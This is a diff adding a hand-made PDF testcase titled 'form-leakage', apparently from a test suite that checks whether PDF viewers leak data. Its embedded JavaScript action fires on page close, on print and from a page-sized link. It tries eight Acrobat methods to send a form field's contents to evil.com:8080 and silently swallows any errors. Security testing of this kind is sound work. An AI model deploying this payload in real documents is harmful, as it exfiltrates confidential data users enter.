@@ -1,0 +1,93 @@
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /AcroForm << /Fields [6 0 R] >>
+     /AA << /DP 5 0 R >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >>
+     /Annots [6 0 R
+              << /Type /Annot
+                 /Subtype /Link
+                 /Open true
+                 /A 5 0 R
+                 /H /N
+                 /Rect [0 0 595 500]
+              >>]
+     /AA << /C 5 0 R >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 72 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'form-leakage') Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS (
+/* --------------------------------------------------------------------------------------------------------------- */
+/* --------------------------------------[ Acrobat JavaScript Scripting Guide ]----------------------------------- */
+/* --------------------------------------------------------------------------------------------------------------- */
+try {this.submitForm({cURL: "http://evil.com:8080/"+this.getAnnots()[0].contents});}                      catch(e) {}
+try {this.getURL("http://evil.com:8080/"+this.getAnnots()[0].contents);}                                  catch(e) {}
+try {app.launchURL("http://evil.com:8080/"+this.getAnnots()[0].contents);}                                catch(e) {}
+try {app.media.getURLData("http://evil.com:8080/"+this.getAnnots()[0].contents, "audio/mp3");}            catch(e) {}
+try {SOAP.connect("http://evil.com:8080/"+this.getAnnots()[0].contents);}                                 catch(e) {}
+try {SOAP.request({cURL:"http://evil.com:8080/"+this.getAnnots()[0].contents, oRequest:{}, cAction:""});} catch(e) {}
+try {this.importDataObject("file", "http://evil.com:8080/"+this.getAnnots()[0].contents);}                catch(e) {}
+try {app.openDoc("http://evil.com:8080/"+this.getAnnots()[0].contents);}                                  catch(e) {}
+/* --------------------------------------------------------------------------------------------------------------- */
+)
+  >>
+endobj
+
+6 0 obj
+  << /Type /Annot
+     /Subtype /FreeText
+     /FT /Tx /T (x)
+     /BS << /S /S /W 0 >>
+     /Rect [107 620 500 720] /F 4
+     /DA (/Helv 22 Tf 0 g)
+     /Contents (Insert confidential data here...)
+  >>
+endobj
+
+xref
+0 7
+0000000000 65535 f 
+0000000010 00000 n 
+0000000131 00000 n 
+0000000232 00000 n 
+0000000641 00000 n 
+0000000765 00000 n 
+0000002254 00000 n 
+trailer
+  << /Root 1 0 R
+     /Size 7
+  >>
+startxref
+2474
+%%EOF
